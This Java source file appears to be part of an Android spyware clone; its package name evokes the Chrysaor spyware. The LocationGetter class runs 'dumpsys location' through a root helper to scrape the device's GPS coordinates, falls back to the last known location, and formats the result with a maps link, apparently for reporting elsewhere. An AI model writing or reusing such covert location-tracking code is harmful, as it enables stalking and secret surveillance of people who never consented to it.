package com.android.chrysaoralike;

import android.content.Context;
import android.location.Location;
import android.location.LocationManager;
import android.util.Log;

public class LocationGetter {
    private static final String TAG = "LocationGetter";
    private Context context;
    public LocationGetter(Context context) { this.context = context.getApplicationContext(); }

    public String getLocationString() {
        try {
            String gpsOutput = RootUtils.runCommand("dumpsys location");
            String lat = "Unknown", lon = "Unknown", acc = "Unknown";
            for (String line : gpsOutput.split("\n")) {
                if (line.contains("gps") && line.contains("lat=") && line.contains("lon=")) {
                    try {
                        int latIdx = line.indexOf("lat=");
                        int lonIdx = line.indexOf("lon=");
                        if (latIdx > 0 && lonIdx > 0) {
                            lat = line.substring(latIdx + 4, line.indexOf(",", latIdx));
                            lon = line.substring(lonIdx + 4, line.indexOf(" ", lonIdx));
                            acc = line.contains("accuracy=") ? line.substring(line.indexOf("accuracy=") + 9, line.indexOf(" ", line.indexOf("accuracy="))) : "?";
                        }
                    } catch (Exception ignored) {}
                }
            }
            if (lat.equals("Unknown")) {
                LocationManager lm = (LocationManager) context.getSystemService(Context.LOCATION_SERVICE);
                if (lm != null) {
                    Location last = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
                    if (last == null) last = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
                    if (last != null) {
                        lat = String.valueOf(last.getLatitude());
                        lon = String.valueOf(last.getLongitude());
                        acc = String.valueOf(last.getAccuracy());
                    }
                }
            }
            return "Lat: " + lat + "\nLon: " + lon + "\nAccuracy: " + acc + "m\n[Open Maps](https://maps.google.com/maps?q=" + lat + "," + lon + ")";
        } catch (Exception e) { Log.e(TAG, "Location error", e); return "Error: " + e.getMessage(); }
    }
}